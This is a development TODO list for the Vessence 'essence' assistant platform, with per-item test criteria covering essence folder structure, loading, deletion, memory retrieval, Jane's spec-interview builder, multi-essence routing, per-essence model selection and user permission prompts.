# Vessence Essence Platform — Comprehensive TODO

**Spec:** `configs/VESSENCE_SPEC.md`
**Created:** 2026-03-21

---

## Phase 0: Foundation

### 0.1 Essence Folder Structure & Template
- [ ] Define the canonical folder structure (`manifest.json`, `personality.md`, `knowledge/`, `functions/`, `ui/`, `workflows/`, `working_files/`, `user_data/`)
  - **Test:** Create an essence folder manually following the spec. Run `ls -R` and confirm every required directory and placeholder file exists. Cross-check against the spec doc — every listed item must be present, no extra top-level entries allowed.
- [ ] Create a skeleton template that Jane copies when starting a new essence
  - **Test:** Run the template copy function with essence name "test_essence". Verify the output folder contains all required files/dirs, `manifest.json` has placeholder values, and `personality.md` exists with boilerplate content. Run twice — second run should fail or warn about existing folder.
- [ ] Write a `manifest.json` JSON schema for validation
  - **Test:** Validate 5+ test manifests: (1) valid minimal, (2) valid full, (3) missing required field `role_title`, (4) wrong type for `permissions` (string instead of array), (5) extra unknown field. Schema must accept (1)+(2), reject (3)+(4) with specific error messages, and either accept or warn on (5).
- [ ] Build a CLI validator that checks an essence folder for completeness and schema compliance
  - **Test:** Run validator against: (1) a complete valid essence — passes, (2) essence missing `personality.md` — fails with "missing personality.md", (3) essence with invalid `manifest.json` — fails with schema error details, (4) empty folder — fails listing all missing items. Verify exit codes are non-zero on failure.
- [ ] Document the folder structure in the spec with examples
  - **Test:** Review the spec doc and confirm every folder/file from the canonical structure has a description, purpose, and at least one example value or content snippet. Have a second person follow the docs to create an essence from scratch without other guidance — they should succeed.

### 0.2 Essence Loader
- [ ] Parse `manifest.json` and validate against schema
  - **Test:** Create a valid and an invalid `manifest.json`. Loader accepts valid, rejects invalid with specific error messages. Run on 5+ edge cases (missing fields, wrong types, extra fields, empty file, malformed JSON).
- [ ] Initialize the essence's ChromaDB from `knowledge/chromadb/`
  - **Test:** Place 10 test entries in `knowledge/chromadb/`. After loading, query the ChromaDB collection with a known term and confirm all 10 entries are retrievable. Verify collection name matches the essence name. Load a second essence and confirm its ChromaDB is separate.
- [ ] Register custom functions from `functions/tool_manifest.json` into Amber's tool registry
  - **Test:** Create a `tool_manifest.json` with 2 custom functions (e.g., `calculate_tax`, `lookup_deduction`). After loading, call `amber.get_registered_tools()` and confirm both appear. Invoke each function with test inputs and verify they return expected outputs. Unload essence and confirm tools are gone.
- [ ] Load `personality.md` as the system prompt for the active essence
  - **Test:** Create `personality.md` with a distinctive phrase (e.g., "You are a pirate accountant"). After loading, inspect Amber's system prompt — it must contain the phrase. Send a test message and verify the response style matches the personality.
- [ ] Read `shared_skills` and wire platform-provided skills into the essence
  - **Test:** Set `shared_skills: ["browser", "file_search"]` in manifest. After loading, verify both skills appear in the essence's tool list. Call each skill and confirm it works. Set an invalid skill name (e.g., `"nonexistent_skill"`) and verify the loader warns/errors gracefully.
- [ ] Present permissions manifest to user and require acceptance before activation
  - **Test:** Set `permissions: ["internet", "file_system", "microphone"]` in manifest. On load, verify a prompt appears listing all three. Simulate "Accept" — essence loads fully. Simulate "Decline" — essence does not load, no tools registered, no ChromaDB connected.
- [ ] Handle external credential prompts (ask user for API keys declared in manifest)
  - **Test:** Declare `credentials: [{name: "OPENAI_KEY", required: true}, {name: "OPTIONAL_KEY", required: false}]`. On load, verify prompt appears for `OPENAI_KEY`. Provide it — load succeeds. Skip it — load fails with clear error. Skip `OPTIONAL_KEY` — load succeeds with a warning.
- [ ] Set Amber's role title from `role_title` field ("Amber the accountant")
  - **Test:** Set `role_title: "Tax Guru"` in manifest. After loading, verify Amber's display name/title reads "Amber the Tax Guru". Check Discord bot status and web UI header both reflect the title.
- [ ] Initialize UI from `ui/layout.json`
  - **Test:** Create `layout.json` with type `"hybrid"` and two panels. After loading, verify the UI renders two panels (not the default chat-only view). Switch to an essence with `"chat"` type and confirm it renders the standard chat. Load a malformed `layout.json` — verify graceful fallback to chat.

### 0.3 Essence Unloader
- [ ] Deactivate custom functions from Amber's tool registry
  - **Test:** Load an essence with 2 custom tools, confirm they appear in the registry. Unload the essence and call `amber.get_registered_tools()` — neither tool should be present. Attempt to invoke a deactivated tool — should return "tool not found" error.
- [ ] Tear down essence-specific UI
  - **Test:** Load a `hybrid` UI essence, confirm panels render. Unload — UI should revert to default (chat-only or landing page). No orphaned UI elements, no console errors. Inspect the DOM/view and confirm essence-specific components are removed.
- [ ] Release ChromaDB connection for the essence
  - **Test:** Load an essence, query its ChromaDB — works. Unload — query the same collection and verify it returns an error or empty result (connection released). Check system resources: no lingering ChromaDB connections for the unloaded essence.
- [ ] Preserve the essence folder on disk for future reload
  - **Test:** Load then unload an essence. Verify the essence folder still exists at its path with all files intact. Reload the same essence — it should load successfully with all prior data.
- [ ] Update Amber's role title (revert or show next active essence)
  - **Test:** Load essence A ("Tax Guru"), then load essence B ("Chef"). Unload B — title should revert to "Tax Guru". Unload A — title should revert to default "Amber". Check both Discord status and UI header.

### 0.4 Essence Deleter
- [ ] Prompt user: "Port this essence's memory into Jane's universal memory?"
  - **Test:** Trigger deletion of an essence with 5 ChromaDB entries. Verify the prompt appears with the message including the entry count (e.g., "This essence has 5 memories"). Verify the prompt blocks until user responds.
- [ ] If accepted, migrate essence ChromaDB entries into `user_memories` with source metadata
  - **Test:** Accept migration for an essence with 5 entries. Query `user_memories` ChromaDB for `source: "essence:test_essence"` — all 5 entries must appear with correct content and metadata tag. Verify no duplicates if run twice.
- [ ] If declined, skip migration
  - **Test:** Decline migration for an essence with 5 entries. Query `user_memories` for `source: "essence:test_essence"` — zero results. Verify essence folder is still deleted (migration skip doesn't block deletion).
- [ ] Delete the entire essence folder
  - **Test:** After deletion, run `ls` on the essence path — folder must not exist. Verify parent `essences/` directory still exists. Verify no partial files remain (check with `find essences/ -name "*test_essence*"`).
- [ ] Remove essence from the loaded/available essences list
  - **Test:** Before deletion, confirm essence appears in the list. After deletion, call `get_available_essences()` and `get_loaded_essences()` — essence must not appear in either. Attempt to load the deleted essence — should fail with "essence not found".
- [ ] Clean up any cached state (session data, temp files)
  - **Test:** Load an essence that creates temp files in `working_files/` and session data. Delete the essence. Check `/tmp/` and any cache directories for remnants matching the essence name — none should exist. Check memory/process for dangling references.

### 0.5 Memory Librarian Extension
- [ ] Modify `build_memory_sections()` to accept an optional `essence_chromadb_path` parameter
  - **Test:** Call `build_memory_sections()` without the parameter — works as before (regression check). Call with a valid essence ChromaDB path — returns results including essence memory. Call with an invalid path — raises a clear error, does not crash.
- [ ] When an essence is active, query the essence's ChromaDB in addition to user memory
  - **Test:** Add 3 unique facts to user memory and 3 different facts to essence ChromaDB. Query with a term that matches one from each. Verify both appear in results. Verify user-only facts appear when no essence is active.
- [ ] Merge essence memory results into the retrieval output as a labeled section (e.g., `## Essence Memory (Tax Accountant)`)
  - **Test:** Trigger memory retrieval with an active essence. Inspect the output string — it must contain a section header `## Essence Memory (Tax Accountant)` (using the actual role title). Verify the section appears after user memory, not interleaved.
- [ ] Ensure distance thresholds and deduplication apply to essence memory too
  - **Test:** Add a near-duplicate fact to both user memory and essence memory (same content, slightly different wording). Query and verify only one copy appears in results (deduplication works). Add a very distant/irrelevant fact to essence memory — verify it's excluded by the distance threshold.
- [ ] Test retrieval with and without an active essence to verify no regressions
  - **Test:** Run the full existing memory retrieval test suite with no essence active — all tests pass. Run the same suite with a loaded essence — all tests still pass, plus essence results appear where expected. Compare response times — essence queries add no more than 200ms overhead.

### 0.6 Refactor Vault into Essence #1 (Life Librarian)
- [ ] Create `essences/life_librarian/` folder following the new structure
  - **Test:** Run the CLI validator on `essences/life_librarian/` — it must pass with zero errors. Verify all required files exist: `manifest.json`, `personality.md`, `knowledge/`, `functions/`, `ui/`.
- [ ] Write `manifest.json` with capabilities (`provides: [file_storage, document_retrieval, file_indexing]`)
  - **Test:** Validate the manifest against the JSON schema — passes. Check that `capabilities.provides` contains exactly `["file_storage", "document_retrieval", "file_indexing"]`. Load the manifest and verify all fields parse correctly.
- [ ] Move vault tool classes into `functions/custom_tools.py`
  - **Test:** Import `custom_tools.py` and instantiate each tool class. Call `store_file()` with a test file — succeeds. Call `search_files("test")` — returns results. Verify the old vault tool import paths are removed or redirect to the new location.
- [ ] Write `personality.md` for the archivist role
  - **Test:** Load the file archivist essence. Send "Who are you?" — response should mention file management, document storage, or archival duties. Verify the tone matches the personality description (professional, organized).
- [ ] Migrate vault ChromaDB (`file_index_memories`) into `knowledge/chromadb/`
  - **Test:** Count entries in old `file_index_memories`. After migration, count entries in `knowledge/chromadb/` — counts must match. Query for a known file by name in the new location — found. Query old location — should be empty or removed.
- [ ] Define UI layout (file browser + search = `hybrid` type)
  - **Test:** Load the file archivist and verify the UI renders as `hybrid` with a file browser panel and a search panel alongside chat. Upload a file via the file browser — it appears. Search for it — it's found. Verify layout matches `layout.json` spec.
- [ ] Define conversation starters ("What file are you looking for?", "Upload a document")
  - **Test:** Load the file archivist. Verify two suggested action buttons appear: "What file are you looking for?" and "Upload a document". Click each — first opens chat with the prompt, second opens file picker. Verify no other starters appear.
- [ ] Verify vault web still works when accessed through the essence loader
  - **Test:** Load the file archivist via the essence loader. Navigate to the vault web UI (vessences.com). Upload a file, search for it, download it. All existing vault web functionality must work identically to pre-refactor. Run the existing vault test suite — all pass.
- [ ] Update all vault references in existing code to route through essence loader
  - **Test:** Search the codebase for direct vault imports (`grep -r "from vault" --include="*.py"`). Zero results should remain outside `essences/life_librarian/`. Load the file archivist and perform vault operations — all work. Verify no code directly instantiates vault tools without going through the essence loader.

---

## Phase 1: Jane as Essence Builder

### 1.1 Spec Interview Mode
- [ ] Implement a `/build-essence` command or intent detection that triggers interview mode
  - **Test:** Send `/build-essence` to Jane — she responds with the first interview question. Send "I want to create a new essence" — intent detection triggers interview mode. Send an unrelated message — interview mode is NOT triggered.
- [ ] Build a state machine that tracks which sections have been covered
  - **Test:** Start an interview, answer sections 1, 2, and 3. Ask Jane "what's left?" — she lists sections 4-12 as uncovered. Answer section 4, ask again — sections 5-12 remain. Verify state persists across messages in the same session.
- [ ] Jane refuses to proceed to code until all 12 sections are answered
  - **Test:** Answer only 11 of 12 sections, then say "build it". Jane should respond with "Section X is not yet covered" and refuse to generate code. Answer the final section, say "build it" — Jane proceeds to code generation.
- [ ] Each section has required and optional questions
  - **Test:** Start section "Identity & Personality". Jane asks required questions (role, style, domain). If user answers all required ones and says "next", Jane moves on. If user skips a required question, Jane insists. Optional questions can be skipped with "skip" or "next".
- [ ] Jane can revisit sections if user wants to change answers
  - **Test:** Complete sections 1-5. Say "go back to section 2" or "change the personality". Jane re-enters section 2, shows previous answers, and allows edits. After editing, the state machine reflects the updated answers while preserving sections 3-5.
- [ ] Jane summarizes each section after the user answers for confirmation
  - **Test:** Complete the Identity section. Jane presents a summary (e.g., "Role: Tax Accountant, Style: Professional, Domain: US Tax Law"). User confirms — moves to next section. User says "change the style" — Jane allows editing before moving on.

### 1.2 Interview Section: Identity & Personality
- [ ] Ask: What role does Amber take on? What's the role title?
  - **Test:** Jane asks this question when section starts. User answers "Tax Accountant". Jane records `role_title: "Tax Accountant"` in the spec draft. Verify by asking Jane to show the current spec — role title appears.
- [ ] Ask: What communication style? (formal, casual, technical, friendly)
  - **Test:** User answers "formal and technical". Jane records the style. Generated `personality.md` must include instructions for formal and technical communication. Verify the generated personality doesn't include conflicting casual language.
- [ ] Ask: What expertise domain?
  - **Test:** User answers "US federal and state tax law". Jane records the domain. Generated personality and knowledge plans reference this domain. Verify the spec draft shows the domain under the Identity section.
- [ ] Ask: Any behavioral boundaries? (what the essence should NOT do)
  - **Test:** User answers "Never give specific legal advice, always recommend consulting a CPA". Jane records this boundary. Generated `personality.md` must include this as a constraint. Test: send the loaded essence a message asking for legal advice — it should refuse per the boundary.
- [ ] Generate draft `personality.md` from answers
  - **Test:** Complete all Identity questions. Jane generates `personality.md`. Read the file — it contains the role title, communication style, domain expertise, and behavioral boundaries. File is valid markdown. Load it as a system prompt and verify Amber's behavior matches.

### 1.3 Interview Section: Knowledge Base
- [ ] Ask: What does the essence know on day one?
  - **Test:** Jane asks this question. User answers "2024 US tax brackets and standard deductions". Jane records this as initial knowledge. Verify the knowledge ingestion plan includes this data. Generated ChromaDB should contain entries for 2024 tax brackets.
- [ ] Ask: Are there specific documents, websites, or data sources to ingest?
  - **Test:** User provides a URL and a PDF path. Jane records both as ingestion sources. Verify the build plan includes steps to scrape the URL and parse the PDF. If user says "none", Jane accepts and moves on.
- [ ] Ask: Should the essence have any pre-filled facts in its ChromaDB?
  - **Test:** User provides 3 specific facts. Jane records them. After essence build, query the ChromaDB for each fact — all 3 must be present. If user says "no pre-filled facts", ChromaDB should have only ingested content (if any), not arbitrary facts.
- [ ] Plan the knowledge ingestion pipeline (URLs to scrape, PDFs to parse, facts to embed)
  - **Test:** After Knowledge section is complete, Jane outputs a pipeline plan listing: (1) URLs to scrape with expected content, (2) PDFs to parse with paths, (3) facts to embed. Verify each item has a clear action. Execute the pipeline on a test essence — all sources are ingested without errors.

### 1.4 Interview Section: Custom Functions
- [ ] Ask: What can this essence DO that Vessence doesn't already provide?
  - **Test:** Jane asks this question. User describes "calculate estimated quarterly taxes". Jane identifies this as a custom function. If user says "nothing custom", Jane records zero custom functions and moves on.
- [ ] For each function: name, description, inputs, outputs, behavior
  - **Test:** User defines a function. Jane asks for name ("calculate_tax"), description, inputs (income: float, state: string), outputs (tax_amount: float), and behavior. Verify all 5 fields are captured. Generated `tool_manifest.json` must contain all fields for this function.
- [ ] Determine if any functions need external APIs
  - **Test:** User describes a function that calls the IRS API. Jane identifies the API dependency and records it. Verify the manifest includes the API under `credentials` and `permissions` includes `"internet"`. For functions with no API needs, no extra credentials are added.
- [ ] Generate `tool_manifest.json` from answers
  - **Test:** Define 2 custom functions during interview. After generation, read `tool_manifest.json` — it contains exactly 2 function entries with correct names, descriptions, inputs, outputs. Validate against the tool manifest schema — passes.

### 1.5 Interview Section: Shared Vessence Skills
- [ ] Present the list of available platform skills
  - **Test:** Jane shows a list of skills (e.g., browser, file_search, calendar, TTS). Verify the list matches the current `SKILLS_REGISTRY.md`. List is formatted clearly with name and short description for each skill.
- [ ] Ask which ones the essence needs
  - **Test:** User selects "browser" and "calendar". Jane records `shared_skills: ["browser", "calendar"]`. Verify the spec draft reflects these selections. If user selects none, `shared_skills` is an empty array.
- [ ] Validate that requested skills exist on the platform
  - **Test:** User requests "browser" (exists) and "teleportation" (doesn't exist). Jane accepts "browser" and warns that "teleportation" is not available. Asks user to remove or replace it before proceeding.
- [ ] Record selections in manifest
  - **Test:** After section completion, inspect the generated manifest. `shared_skills` array contains exactly the validated skill names the user selected. No duplicates, no invalid entries.

### 1.6 Interview Section: UI Paradigm
- [ ] Ask: How should Amber present to the user? (chat, cards, dashboard, form wizard, hybrid)
  - **Test:** Jane presents the 5 options with brief descriptions. User selects "dashboard". Jane records `ui_type: "dashboard"`. Verify the spec draft shows "dashboard" under UI section.
- [ ] For non-chat types: what components? What data feeds them?
  - **Test:** User selects "dashboard" and describes 3 panels: calendar, stats, recent activity. Jane records each panel with its data source. Generated `layout.json` contains 3 panel definitions. For "chat" type, Jane skips this question.
- [ ] Ask about visual preferences (colors, icons, branding within the essence)
  - **Test:** User specifies "blue theme, calculator icon". Jane records these. Generated `layout.json` includes `theme: "blue"` and `icon: "calculator"`. If user says "default", Jane uses platform defaults.
- [ ] Generate draft `ui/layout.json`
  - **Test:** Complete UI section. Jane generates `layout.json`. Validate it against the UI schema — passes. Load it in the UI renderer — it renders the correct type with specified panels/components. Check that the `type` field matches user's selection.

### 1.7 Interview Section: Interaction Patterns
- [ ] Ask: What are the first things the essence says or shows when loaded?
  - **Test:** User specifies 3 conversation starters. Jane records them. Generated manifest `interaction_patterns.conversation_starters` contains exactly 3 entries. Load the essence — all 3 appear as suggested actions.
- [ ] Ask: Are there multi-step workflows? (guided sequences, wizards)
  - **Test:** User describes a 4-step tax filing workflow. Jane records steps, conditions, and data collected at each step. Generated `workflows/sequences/tax_filing.json` contains 4 steps. If user says "no workflows", no workflow files are created.
- [ ] Ask: Any proactive triggers? (date-based, condition-based automations)
  - **Test:** User specifies "Remind me on April 1st about tax deadline". Jane records this as a date-based trigger. Generated manifest `interaction_patterns.proactive_triggers` contains the trigger with date and action. If no triggers, array is empty.
- [ ] Generate `workflows/onboarding.json` and `workflows/sequences/` files
  - **Test:** After section completion, verify `onboarding.json` exists and contains the conversation starters and initial instructions. Verify each defined workflow has a corresponding file in `sequences/`. Validate all JSON files against their schemas.

### 1.8 Interview Section: Capabilities Declaration
- [ ] Ask: What does this essence provide to other essences?
  - **Test:** User answers "tax_calculation, deduction_lookup". Jane records `capabilities.provides: ["tax_calculation", "deduction_lookup"]`. Verify the manifest contains these. If user says "nothing", array is empty.
- [ ] Ask: What might this essence need from other essences?
  - **Test:** User answers "document_retrieval". Jane records `capabilities.consumes: ["document_retrieval"]`. Verify the manifest contains this. Jane notes that the file archivist provides this capability (if known).
- [ ] Validate capability names against a standard vocabulary (or allow custom)
  - **Test:** User enters "file_storage" (standard) and "quantum_analysis" (custom). Jane accepts both but marks "quantum_analysis" as custom. Verify the manifest distinguishes standard vs custom if applicable. No crash on unknown names.
- [ ] Record in manifest `capabilities.provides` and `capabilities.consumes`
  - **Test:** Inspect generated `manifest.json`. Both `capabilities.provides` and `capabilities.consumes` are present as arrays with the correct entries. Validate against schema — passes.

### 1.9 Interview Section: LLM Model
- [ ] Ask: Which LLM model works best for this essence? Why?
  - **Test:** Jane asks this question. User answers "Claude Sonnet because it's fast and good at structured output". Jane records model and reasoning. Verify the spec draft includes model choice with justification.
- [ ] Present common options (Claude Haiku/Sonnet/Opus, GPT-4o, Gemini Flash/Pro)
  - **Test:** Jane displays a list of at least 6 models with brief pros/cons. Verify all listed models are real, currently available options. List includes pricing tier hints (cheap/mid/expensive).
- [ ] Record preferred model and reasoning in manifest
  - **Test:** Inspect generated `manifest.json`. `preferred_model` field contains the selected model ID. `model_reasoning` field contains the user's reasoning text. Both are non-empty strings.

### 1.10 Interview Section: Permissions & Credentials
- [ ] Ask: What hardware/resources does this essence need access to?
  - **Test:** Jane asks this question. User answers "internet and file system". Jane records both. Verify `permissions` array in manifest contains `["internet", "file_system"]`. If user says "none", permissions array is empty.
- [ ] Present standard permission categories (internet, file system, microphone, camera, screen, clipboard)
  - **Test:** Jane displays all 6 standard categories. Verify each has a one-line description of what it grants. User can select multiple by listing them or saying "all".
- [ ] Ask: Does this essence need any third-party API keys?
  - **Test:** User says "yes, IRS e-file API key". Jane records the credential. Verify `credentials` array in manifest contains an entry with name "IRS_EFILE_API_KEY" (or similar). If user says "no API keys", `credentials` is empty.
- [ ] For each credential: name, description, required vs optional
  - **Test:** User defines a required credential ("IRS_KEY") and an optional one ("ANALYTICS_KEY"). Verify both appear in manifest with `required: true` and `required: false` respectively. Descriptions are non-empty.
- [ ] Record in manifest
  - **Test:** Inspect generated `manifest.json`. `permissions` and `credentials` sections are both present and match user's answers exactly. Validate against schema — passes.

### 1.11 Interview Section: User Data Layer
- [ ] Ask: What user-specific data will accumulate over time?
  - **Test:** Jane asks this question. User answers "tax filing history, uploaded W-2 forms, calculation results". Jane records all three data types. Verify the spec draft lists them under User Data.
- [ ] Ask: Where should it be stored? (essence ChromaDB, working_files, user_data folder)
  - **Test:** User specifies "filing history in ChromaDB, W-2s in user_data, calculations in working_files". Jane records storage location for each data type. Verify the spec draft maps each type to its location. If user picks only one location for all, that's recorded.
- [ ] Ask: Is any of this data sensitive? (affects permissions manifest)
  - **Test:** User marks "W-2 forms" as sensitive. Jane adds a `sensitive_data` flag or note in the manifest. Verify the permissions manifest is updated to include appropriate data protection requirements. If nothing is sensitive, no extra permissions are added.

### 1.12 Spec Document Generation
- [ ] Jane compiles all interview answers into a complete spec document
  - **Test:** Complete all 12 sections. Jane generates a spec document. Verify it contains a section for each of the 12 interview topics. Every answer the user gave appears in the document. No sections are empty or missing.
- [ ] Spec document is human-readable markdown with all decisions
  - **Test:** Open the generated spec in a markdown viewer. Verify proper heading hierarchy (H1, H2, H3), bullet lists, and formatting. No raw JSON blobs — all data is presented in readable prose or tables. File size is reasonable (under 50KB).
- [ ] Present to user for review and approval
  - **Test:** Jane shows the complete spec and asks "Do you approve this spec?". Verify the full spec is displayed (not truncated). Jane waits for explicit approval before proceeding.
- [ ] Allow user to request changes before approval
  - **Test:** User says "Change the role title to Senior Tax Advisor". Jane updates the spec and re-presents it with the change highlighted. Verify the old value is replaced, not duplicated. Multiple rounds of changes work.
- [ ] Only after approval does Jane proceed to code generation
  - **Test:** User says "approved" or "looks good". Jane begins code generation. Before approval, sending "build it" or "generate" should prompt for spec review first. Verify code generation does NOT start without explicit approval.

### 1.13 Code Generation from Spec
- [ ] Generate folder structure from template
  - **Test:** After spec approval, verify the essence folder is created at `essences/<essence_name>/`. All required directories exist. Run the CLI validator — passes. Folder structure matches the template exactly.
- [ ] Generate `manifest.json` from spec answers
  - **Test:** Read the generated `manifest.json`. Every field matches the spec document (role_title, permissions, credentials, capabilities, shared_skills, preferred_model). Validate against JSON schema — passes.
- [ ] Generate `personality.md` from identity section
  - **Test:** Read `personality.md`. It contains role, communication style, domain expertise, and behavioral boundaries from the spec. Load it as a system prompt — Amber's responses match the described personality.
- [ ] Generate `functions/custom_tools.py` stubs from function definitions
  - **Test:** Read `custom_tools.py`. Each function from the spec has a stub with correct name, docstring, parameters, and return type. Import the file — no syntax errors. Each function raises `NotImplementedError` (stub). Function count matches spec.
- [ ] Generate `functions/tool_manifest.json` from function declarations
  - **Test:** Read `tool_manifest.json`. Each function has name, description, input schema, and output schema matching the spec. Validate against tool manifest schema — passes. Cross-check with `custom_tools.py` — names match.
- [ ] Generate `ui/layout.json` from UI paradigm answers
  - **Test:** Read `layout.json`. Type matches spec (chat/dashboard/hybrid/etc.). Panel definitions match spec. Validate against UI schema — passes. Load in the renderer — renders without errors.
- [ ] Generate `workflows/` files from interaction pattern answers
  - **Test:** Check `workflows/onboarding.json` contains conversation starters from spec. Check `workflows/sequences/` contains a file for each defined workflow. All JSON files are valid. Workflow step counts match spec.
- [ ] Populate `knowledge/chromadb/` with pre-filled domain knowledge
  - **Test:** Query the generated ChromaDB for each pre-filled fact from the spec — all found. Query for ingested content (from URLs/PDFs) — present. Total entry count matches expected (facts + ingested content). No empty collections.
- [ ] Run the essence validator to verify completeness
  - **Test:** The validator runs automatically after generation and outputs a pass/fail report. All checks pass. Intentionally corrupt one file and re-run — validator catches the issue and reports it.
- [ ] Load the essence into Amber for testing
  - **Test:** The generated essence loads via the essence loader without errors. Amber's role title updates. Custom tools are registered. Send a test message — Amber responds in character. Conversation starters appear in UI.

---

## Phase 2: Multi-Essence Runtime

### 2.1 Simultaneous Essence Support
- [ ] Modify Amber's runtime to maintain a list of loaded essences
  - **Test:** Load 3 essences sequentially. Call `amber.get_loaded_essences()` — returns a list of 3 with correct names. Unload one — list shows 2. Reload — list shows 3 again. Verify no essence appears twice.
- [ ] Each loaded essence has its own ChromaDB connection, tool registry, and UI state
  - **Test:** Load essences A and B, each with different tools and ChromaDB data. Query A's ChromaDB — returns A's data only. Call A's tool — works. Call B's tool — works. Verify A's tool is not in B's registry and vice versa.
- [ ] Route incoming user messages to the appropriate essence (or Jane)
  - **Test:** Load Tax Accountant and Chef essences. Send "What's the standard deduction?" — routed to Tax Accountant. Send "How do I make pasta?" — routed to Chef. Send "What essences are loaded?" — routed to Jane. Verify each response comes from the correct essence.
- [ ] Handle essence-specific vs general messages (intent detection)
  - **Test:** Send 10 test messages: 5 essence-specific and 5 general. Verify at least 90% are routed correctly. Test ambiguous messages (e.g., "help") — routed to Jane or the most recently active essence. Verify response includes which essence answered.
- [ ] Display all active essence role titles in the UI
  - **Test:** Load 3 essences. Check the UI — all 3 role titles appear (e.g., in a sidebar, header, or status bar). Unload one — only 2 titles remain. Verify each title is clickable or interactive (if applicable).

### 2.2 Mode A: Jane as PM (Top-Down Orchestration)
- [ ] Jane reads `capabilities.provides` from all loaded essences
  - **Test:** Load 3 essences with different capabilities. Ask Jane "what can the team do?" — she lists all capabilities from all loaded essences. Unload one — its capabilities no longer appear.
- [ ] Jane decomposes user request into subtasks
  - **Test:** Send "Prepare my tax documents and organize them in my vault". Jane should decompose into: (1) gather tax info (Tax Accountant), (2) store documents (Life Librarian). Verify Jane outputs the subtask list before executing.
- [ ] Jane matches subtasks to essences by capability
  - **Test:** For a decomposed request with 3 subtasks, verify each subtask is assigned to the correct essence based on `capabilities.provides`. If no essence matches a subtask, Jane reports "No essence available for: [subtask]".
- [ ] Jane sends subtask requests to essences and collects responses
  - **Test:** Trigger a multi-essence task. Verify each essence receives its subtask (check logs or intercept calls). Each essence returns a response. Jane collects all responses before proceeding.
- [ ] Jane aggregates results and delivers final output to user
  - **Test:** After collecting responses from 2 essences, Jane presents a unified summary. Verify the summary includes contributions from both essences, clearly attributed. The user sees one cohesive response, not raw essence outputs.
- [ ] Jane can hand off final assembly to a specific essence
  - **Test:** Jane delegates final formatting to the Life Librarian (e.g., "compile these into a PDF"). Verify the Life Librarian receives the aggregated data and produces the final output. User receives the output from the designated essence.
- [ ] Handle failures gracefully (essence timeout, error, no capable essence found)
  - **Test:** (1) Simulate an essence timeout (mock 30s delay) — Jane reports "Tax Accountant timed out" and continues with other results. (2) Simulate an essence error — Jane reports the error and skips that subtask. (3) Request a capability no essence provides — Jane says "No loaded essence can handle X".

### 2.3 Mode C: Collaborative (Peer-to-Peer)
- [ ] Build a capability registry that all loaded essences register with
  - **Test:** Load 3 essences. Query the registry — all capabilities from all 3 are listed. Unload one — its capabilities are deregistered. Verify the registry is a single shared data structure, not per-essence.
- [ ] Implement a request/response protocol between essences
  - **Test:** Essence A sends a request to Essence B via the protocol. Verify the request contains: source, target, capability, payload. Essence B receives it, processes, and sends a response. Verify the response contains: source, result, status. Round-trip completes in under 5 seconds.
- [ ] When an essence needs a capability it doesn't have, it queries the registry
  - **Test:** Essence A (Tax Accountant) needs `document_retrieval`. It queries the registry and finds Essence B (Life Librarian) provides it. Verify A sends a request to B and receives the documents. If no provider exists, A receives a "capability not available" response.
- [ ] Platform auto-wires the request to a providing essence
  - **Test:** Essence A requests `document_retrieval` without knowing which essence provides it. The platform resolves the provider and routes the request. Verify A never references B by name — only by capability. Response arrives at A correctly.
- [ ] Handle circular dependencies and deadlocks
  - **Test:** Create 2 essences where A consumes from B and B consumes from A. Trigger a request chain A→B→A. Verify the platform detects the cycle and breaks it (returns error after max depth or timeout). No infinite loops or hangs.
- [ ] Log all inter-essence communication for debugging
  - **Test:** Trigger 5 inter-essence requests. Check the log file — all 5 requests and their responses are logged with timestamps, source, target, capability, and status. Log format is parseable (JSON lines or structured text).

### 2.4 Essence Branding in UI
- [ ] Display "Amber the [role_title]" in chat headers, Discord presence, and app UI
  - **Test:** Load "Tax Guru" essence. Check chat header — reads "Amber the Tax Guru". Check Discord bot status — shows "Tax Guru". Check Android app — title bar shows the role. Verify all 3 locations match.
- [ ] When multiple essences are active, show which essence is responding
  - **Test:** Load 2 essences. Send a message routed to essence A. Verify the response is labeled with A's name/icon. Send another routed to B — labeled with B's name. Verify there's no ambiguity about which essence replied.
- [ ] Load essence-specific icons/avatars if provided in `ui/assets/`
  - **Test:** Place a `avatar.png` in `ui/assets/` for an essence. Load it — verify the avatar appears in chat messages, UI header, and/or Discord. Remove the avatar file — verify a default icon is used instead (no broken image).
- [ ] Discord: update bot status/activity to reflect active essences
  - **Test:** Load "Tax Guru" essence. Check Discord bot status — shows "Acting as Tax Guru" or similar. Load a second essence — status updates to show both. Unload all — status reverts to default. Verify status updates within 10 seconds.

### 2.5 Per-Essence LLM Model Selection
- [ ] Read `preferred_model` from manifest on load
  - **Test:** Set `preferred_model: "claude-sonnet"` in manifest. Load the essence. Check the model selection state — "claude-sonnet" is the active model for this essence. If `preferred_model` is missing, a platform default is used.
- [ ] Show preferred model with "recommended" badge in UI dropdown
  - **Test:** Open the model dropdown for the essence. Verify `claude-sonnet` has a "Recommended" badge/label. Other models appear without the badge. Badge is visible and distinct.
- [ ] List all models the user has API keys for as alternatives
  - **Test:** User has API keys for Claude, GPT-4o, and Gemini. Dropdown shows all 3 as options. If user removes the Gemini key, only Claude and GPT-4o appear. Verify models without keys are not shown.
- [ ] Warn if user selects a model weaker than recommended
  - **Test:** Recommended model is Claude Sonnet. User selects Claude Haiku (weaker). A warning appears: "This model may underperform for this essence. Recommended: Claude Sonnet." User selects GPT-4o (comparable) — no warning.
- [ ] Store model override in user preferences (per-essence)
  - **Test:** Override model to GPT-4o for essence A. Unload and reload A — GPT-4o is still selected (persisted). Essence B still uses its own preferred model. Clear the override — reverts to recommended.
- [ ] Route LLM calls to the selected model for each essence independently
  - **Test:** Load essence A (Claude) and essence B (GPT-4o). Send a message to each. Check API logs — A's message went to Claude API, B's message went to OpenAI API. Responses come back from the correct models.

### 2.6 Permissions Flow
- [ ] On essence load, parse `permissions` from manifest
  - **Test:** Set `permissions: ["internet", "microphone"]`. Load the essence — verify the loader reads both permissions. Set permissions to an empty array — loader proceeds with no permissions to request.
- [ ] Display permissions list to user in a clear, non-technical format
  - **Test:** Permissions `["internet", "file_system", "microphone"]` displayed as: "Access the internet", "Read and write files", "Use your microphone". Verify each permission has a human-readable description, not just the raw key.
- [ ] Require explicit "Accept All" before loading completes
  - **Test:** Load an essence with 3 permissions. Before clicking Accept — essence is NOT loaded (no tools, no ChromaDB, no UI). Click "Accept All" — essence loads fully. Verify there's no way to partially accept (all or nothing).
- [ ] If user declines, essence is not loaded
  - **Test:** Load an essence and click "Decline". Verify: no tools registered, no ChromaDB connected, no UI rendered, essence does NOT appear in `get_loaded_essences()`. A message confirms "Essence not loaded due to declined permissions".
- [ ] Store accepted permissions in user preferences for future reloads
